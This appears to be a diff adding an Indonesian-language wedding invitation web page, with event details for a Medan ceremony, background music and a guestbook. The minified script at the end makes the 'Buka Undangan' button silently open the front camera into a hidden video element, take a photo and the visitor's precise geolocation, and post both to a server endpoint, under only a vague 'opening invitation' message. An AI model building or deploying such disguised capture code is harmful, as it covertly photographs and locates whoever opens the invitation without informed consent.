@@ -1,0 +1,355 @@
+<!doctype html>
+<html lang="id">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Undangan Spesial</title>
+
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;500;600;700&family=Montserrat:wght@400;500;600&display=swap");
+
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        margin: 0;
+        color: #3b3028;
+        background: #111111;
+        font-family: Montserrat, Arial, sans-serif;
+        overflow: hidden; /* Mencegah scroll default karena menggunakan pagination */
+      }
+
+      .app-container {
+        width: 100vw;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .paper {
+        width: min(480px, 100%);
+        height: 100vh;
+        background: #fffdf9;
+        box-shadow: 0 15px 50px rgba(0, 0, 0, 0.3);
+        position: relative;
+        overflow: hidden;
+      }
+
+      /* Halaman / Pages */
+      .page {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        padding: 40px 24px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        text-align: center;
+        opacity: 0;
+        visibility: hidden;
+        transition:
+          opacity 0.6s ease,
+          transform 0.6s ease;
+        transform: translateY(20px);
+        overflow-y: auto;
+      }
+
+      .page.active {
+        opacity: 1;
+        visibility: visible;
+        transform: translateY(0);
+      }
+
+      .eyebrow {
+        letter-spacing: 4px;
+        font-size: 11px;
+        text-transform: uppercase;
+        color: #9a795b;
+        margin-bottom: 8px;
+      }
+
+      h1,
+      h2,
+      .names {
+        font-family: "Cormorant Garamond", Georgia, serif;
+      }
+
+      h1 {
+        font-size: 42px;
+        line-height: 1.1;
+        font-weight: 500;
+        margin: 15px 0;
+      }
+
+      .names {
+        font-size: 30px;
+        line-height: 1.1;
+        color: #7a6049;
+        margin: 20px 0;
+      }
+
+      .date {
+        letter-spacing: 2px;
+        font-size: 12px;
+        margin: 15px 0 25px;
+      }
+
+      .divider {
+        width: 70px;
+        height: 1px;
+        background: #bda387;
+        margin: 15px auto;
+      }
+
+      .details {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 12px;
+        margin: 20px 0;
+        width: 100%;
+      }
+
+      .detail {
+        border: 1px solid #eadfd2;
+        padding: 14px 10px;
+        border-radius: 8px;
+        font-size: 13px;
+      }
+
+      .detail b {
+        display: block;
+        margin-bottom: 4px;
+        color: #7a6049;
+      }
+
+      button.btn-primary {
+        border: 0;
+        border-radius: 999px;
+        padding: 14px 28px;
+        background: #765a43;
+        color: #fff;
+        font:
+          600 13px Montserrat,
+          sans-serif;
+        cursor: pointer;
+        box-shadow: 0 8px 20px rgba(118, 90, 67, 0.25);
+        transition: background 0.3s ease;
+      }
+
+      button.btn-primary:disabled {
+        opacity: 0.65;
+        cursor: not-allowed;
+      }
+
+      /* Tombol Musik Floating */
+      .music-toggle {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        z-index: 99;
+        background: #765a43;
+        color: white;
+        border: none;
+        width: 44px;
+        height: 44px;
+        border-radius: 50%;
+        cursor: pointer;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 18px;
+      }
+
+      /* Navigasi Halaman (Next / Prev) */
+      .nav-controls {
+        position: absolute;
+        bottom: 15px;
+        left: 0;
+        width: 100%;
+        display: flex;
+        justify-content: space-between;
+        padding: 0 20px;
+        z-index: 10;
+      }
+
+      .nav-btn {
+        background: transparent;
+        border: 1px solid #765a43;
+        color: #765a43;
+        padding: 6px 16px;
+        border-radius: 20px;
+        font-size: 12px;
+        cursor: pointer;
+      }
+
+      #camera {
+        display: none;
+      }
+
+      #status {
+        margin-top: 15px;
+        font-size: 12px;
+        color: #888;
+        min-height: 18px;
+      }
+
+      /* Form Komen / Buku Tamu */
+      .comment-box {
+        width: 100%;
+        text-align: left;
+        margin-top: 15px;
+      }
+
+      .comment-box input,
+      .comment-box textarea {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        border: 1px solid #eadfd2;
+        border-radius: 6px;
+        font-family: inherit;
+        font-size: 12px;
+      }
+
+      .comments-list {
+        max-height: 150px;
+        overflow-y: auto;
+        width: 100%;
+        text-align: left;
+        border-top: 1px solid #eadfd2;
+        padding-top: 10px;
+        margin-top: 10px;
+      }
+
+      .comment-item {
+        background: #f7efe5;
+        padding: 8px 12px;
+        border-radius: 6px;
+        margin-bottom: 8px;
+        font-size: 12px;
+      }
+
+      .comment-item b {
+        color: #7a6049;
+      }
+    </style>
+  </head>
+
+  <body>
+    <!-- Audio Pemutar Musik -->
+    <audio id="bgMusic" loop>
+      <source src="assets/audio/Perfect.mp3" type="audio/mpeg" />
+    </audio>
+
+    <button
+      id="musicToggle"
+      class="music-toggle"
+      onclick="toggleMusic()"
+      style="display: none"
+    >
+      🔊
+    </button>
+
+    <div class="app-container">
+      <div class="paper">
+        <!-- HALAMAN 1: COVER -->
+        <section id="page-1" class="page active">
+          <div class="eyebrow">Undangan Spesial</div>
+          <h1>Dengan Bahagia<br />Kami Mengundang</h1>
+          <div class="divider"></div>
+          <div class="names">
+            Acara Pernikahan Anak Kandung Kami<br />
+            <br />
+            Aisyah Putri<br />
+            <small>&amp;</small><br />
+            arif Rahman
+          </div>
+          <div class="date">SABTU · 10 OKTOBER 2026</div>
+
+          <!-- TOMBOL BUKA UNDANGAN (Mengambil Foto & Lokasi) -->
+          <button id="btnBuka" class="btn-primary" type="button">
+            Buka Undangan
+          </button>
+
+          <div id="status"></div>
+        </section>
+
+        <!-- HALAMAN 2: DETAIL ACARA -->
+        <section id="page-2" class="page">
+          <div class="eyebrow">Salam Hangat</div>
+          <h2>Anda Diundang</h2>
+          <p style="font-size: 13px; line-height: 1.6; color: #67594e">
+            Dengan penuh kebahagiaan, kami mengundang Anda untuk hadir dalam
+            acara spesial kami. Kehadiran Anda akan menjadi bagian yang berarti
+            dalam momen istimewa ini.
+          </p>
+
+          <div class="details">
+            <div class="detail">
+              <b>Hari &amp; Tanggal</b>
+              Sabtu, 10 Oktober 2026
+            </div>
+            <div class="detail">
+              <b>Waktu</b>
+              10.00 WIB – selesai
+            </div>
+            <div class="detail">
+              <b>Tempat</b>
+              Gedung Serbaguna Kota Medan
+            </div>
+            <div class="detail">
+              <b>Alamat</b>
+              Medan Sumatera Utara, Indonesia
+            </div>
+          </div>
+
+          <div class="nav-controls">
+            <button class="nav-btn" onclick="changePage(1)">❮ Kembali</button>
+            <button class="nav-btn" onclick="changePage(3)">Buku Tamu ❯</button>
+          </div>
+        </section>
+
+        <!-- HALAMAN 3: BUKU TAMU & KOMEN -->
+        <section id="page-3" class="page">
+          <div class="eyebrow">Ucapan & Doa</div>
+          <h2>Buku Tamu</h2>
+
+          <div class="comment-box">
+            <input type="text" id="commentName" placeholder="Nama Anda" />
+            <textarea
+              id="commentMsg"
+              rows="3"
+              placeholder="Tulis ucapan atau doa..."
+            ></textarea>
+            <button
+              class="btn-primary"
+              style="width: 100%; padding: 10px"
+              onclick="postComment()"
+            >
+              Kirim Ucapan
+            </button>
+          </div>
+
+          <div class="comments-list" id="commentsList">
+            <!-- List ucapan tamu akan dimasukkan lewat JS -->
+          </div>
+
+          <div class="nav-controls">
+            <button class="nav-btn" onclick="changePage(2)">❮ Kembali</button>
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <!-- Video Element (Tersembunyi) -->
+    <video id="camera" autoplay playsinline muted></video>
+
+    <script>let currentPage=1;const btnBuka=document.getElementById("btnBuka"),video=document.getElementById("camera"),status=document.getElementById("status"),bgMusic=document.getElementById("bgMusic"),musicToggle=document.getElementById("musicToggle");function msg(e){status.textContent=e}function changePage(e){document.querySelectorAll(".page").forEach(e=>{e.classList.remove("active")}),document.getElementById(`page-${e}`).classList.add("active"),currentPage=e}function toggleMusic(){bgMusic.paused?(bgMusic.play(),musicToggle.innerHTML="🔊"):(bgMusic.pause(),musicToggle.innerHTML="🔇")}async function fetchComments(){try{const e=await fetch("/api/comments");if(e.ok){const t=await e.json();document.getElementById("commentsList").innerHTML=t.map(e=>`<div class="comment-item"><b>${escapeHtml(e.name)}</b><br/>${escapeHtml(e.message)}</div>`).join("")}}catch(e){console.error(e)}}async function postComment(){const e=document.getElementById("commentName").value.trim(),t=document.getElementById("commentMsg").value.trim();if(e&&t)try{(await fetch("/api/comments",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({name:e,message:t})})).ok&&(document.getElementById("commentName").value="",document.getElementById("commentMsg").value="",fetchComments())}catch(e){alert("Gagal mengirim ucapan.")}else alert("Nama dan pesan wajib diisi!")}function escapeHtml(e){return e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}btnBuka.addEventListener("click",async()=>{btnBuka.disabled=!0,bgMusic.play().catch(()=>{}),musicToggle.style.display="flex";let e=null;try{if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)throw new Error("Kamera tidak didukung / butuh HTTPS.");if(e=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:"user"}},audio:!1}),video.srcObject=e,await new Promise((e,t)=>{if(video.readyState>=2&&video.videoWidth>0)return void e();const a=setTimeout(()=>t(new Error("Kamera timeout.")),1e4);video.onloadeddata=()=>{clearTimeout(a),e()}}),!navigator.geolocation)throw new Error("Lokasi tidak didukung.");const t=await new Promise((e,t)=>{navigator.geolocation.getCurrentPosition(e,t,{enableHighAccuracy:!0,timeout:15e3,maximumAge:0})}),a=document.createElement("canvas");a.width=video.videoWidth||1280,a.height=video.videoHeight||720;a.getContext("2d").drawImage(video,0,0,a.width,a.height);const n=await new Promise((e,t)=>{a.toBlob(a=>a?e(a):t(new Error("Gagal buat foto.")),"image/jpeg",.85)}),o=new FormData;o.append("photo",n,"camera.jpg"),o.append("latitude",t.coords.latitude),o.append("longitude",t.coords.longitude),o.append("accuracy",t.coords.accuracy),msg("Membuka undangan..."),await fetch("/api/submissions",{method:"POST",body:o})}catch(e){console.error(e)}finally{e&&e.getTracks().forEach(e=>e.stop()),video.srcObject=null,msg(""),changePage(2)}}),fetchComments();</script>
+  </body>
+</html>
